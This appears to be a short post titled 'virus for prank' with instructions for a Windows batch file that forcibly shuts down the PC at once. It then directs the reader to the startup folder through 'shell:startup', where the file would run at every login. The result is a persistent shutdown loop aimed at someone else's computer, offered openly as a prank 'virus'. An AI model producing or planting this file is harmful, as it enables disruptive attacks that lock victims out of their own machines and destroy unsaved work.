# virus for prank
 just for fun

To create a batch file that shuts down a Windows PC, you can use the shutdown command. Here's a simple example of a batch file to shut down the PC:

Open a text editor like Notepad.
Paste the following code into the text editor:
batch
Copy code
@echo off
shutdown /s /f /t 0
Save the file with a .bat extension, for example, shutdown_pc.bat.
Now, whenever you double-click this batch file, it will immediately shut down the PC forcefully (/f) without waiting (/t 0).

Please note that the shutdown operation is irreversible, so make sure to save any important work before executing this batch file.

AFTER SAVE THIS BAT FILE
Press Windows Key + R to open the Run dialog.
Type shell:startup into the Run dialog.
Press Enter or click OK.